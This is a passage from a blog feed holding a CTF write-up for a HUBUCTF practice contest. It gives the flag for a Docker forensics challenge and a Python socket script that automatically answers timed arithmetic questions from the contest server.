src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>使用了加盐算法，密钥就是上面的password,进行解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath"><a href="#SpeedMath" class="headerlink" title="SpeedMath"></a>SpeedMath</h4><blockquote><p>考点：nc连接，python脚本</p><p>先用nc连接</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>发现会出现算数题目，但是给你输入的时间很短，所以几乎不可能手工做，直接问AI写脚本</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def solve_arithmetic_expression(expression):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    解析并计算算术表达式的结果。</span><br><span class="line">    这里假设表达式只包含整数和基本的加减乘除运算。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # 使用eval计算表达式的结果，但注意eval的安全性问题</span><br><span class="line">        # 在实际应用中，应该使用更安全的解析方法</span><br><span class="line">        result = eval(expression)</span><br><span class="line">        return result</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">def nc_connection(host, port):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用Netcat连接到服务器，并自动解答算术题。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            # 读取服务器发送的数据</span><br><span class="line">            data = s.recv(1024).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">            </span><br><span class="line">            if not data:</span><br><span class="line">                # 如果没有接收到数据，可能是连接已经关闭</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            print(f&quot;Received: &#123;data&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">            # 使用正则表达式匹配算术题目</span><br><span class="line">            match = re.match(r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;, data)</span><br><span class="line">            if match:</span><br><span class="line">                num1 = int(match.group(1))</span><br><span class="line">                operator = match.group(2)</span><br><span class="line">                num2 = int(match.group(3))</span><br><span class="line">                </span><br><span class="line">                # 构造算术表达式</span><br><span class="line">                expression = f&quot;&#123;num1&#125; &#123;operator&#125; &#123;num2&#125;&quot;</span><br><span class="line">                </span><br><span class="line">                # 计算正确答案</span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                if correct_answer is not None:</span><br><span class="line">                    # 将答案发送回服务器（假设服务器期望的是整数答案）</span><br><span class="line">                    s.sendall(f&quot;&#123;correct_answer&#125;\n&quot;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">                else:</span><br><span class="line">                    # 如果无法计算表达式，则退出循环</span><br><span class="line">                    print(&quot;Failed to solve expression.&quot;)</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                # 如果不是算术题目，可能是其他信息或结束信息</span><br><span class="line">                # 这里假设服务器在发送完所有题目后会发送一个非算术题目的消息</span><br><span class="line">                print(&quot;Received non-arithmetic message, possibly final message.&quot;)</span><br><span class="line">                print(f&quot;Final message: &#123;data&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># 使用示例</span><br><span class="line">nc_connection(&#x27;challenge.hubuctf.cn&#x27;, 32478)  # 替换为你的服务器主机名和端口号</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧hubu新星杯实践能力赛模拟赛web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
</feed>
